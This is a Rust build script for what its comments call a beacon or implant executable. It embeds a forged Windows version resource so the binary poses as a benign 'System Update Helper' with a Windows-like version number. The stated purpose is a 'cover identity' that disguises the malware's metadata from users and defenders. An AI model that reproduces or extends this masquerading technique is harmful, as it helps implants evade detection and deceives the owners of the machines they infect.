//! Build script: embed a Windows version resource + application manifest into
//! the beacon-cycle exe so its PE metadata looks like an ordinary application
//! (FileDescription, ProductName, CompanyName, FileVersion, …) rather than a
//! stripped, metadata-less binary — same cover identity as the implant/beacon.
//! Uses `winres` (shells out to `rc.exe` from the MSVC toolchain). If `rc.exe`
//! can't be located the build does NOT abort — the exe still compiles, just
//! without the resource.

fn main() {
    if std::env::var("CARGO_CFG_WINDOWS").is_ok() {
        let mut res = winres::WindowsResource::new();
        res.set("FileDescription", "System Update Helper");
        res.set("ProductName", "System Update Helper");
        res.set("CompanyName", "System Update Helper Project");
        res.set("LegalCopyright", "© 2026 System Update Helper Project. All rights reserved.");
        res.set("OriginalFilename", "updatehelper.exe");
        res.set("InternalName", "updatehelper");
        res.set("Comments", "Applies periodic system maintenance and compatibility updates.");
        res.set("FileVersion", "10.0.22621.0");
        res.set("ProductVersion", "10.0.22621.0");
        res.set_manifest(include_str!("updatehelper.manifest"));
        if let Err(e) = res.compile() {
            println!("cargo:warning=winres: could not compile version resource (rc.exe missing?): {e}");
        }
    }
    println!("cargo:rerun-if-changed=updatehelper.manifest");
    println!("cargo:rerun-if-changed=build.rs");
}
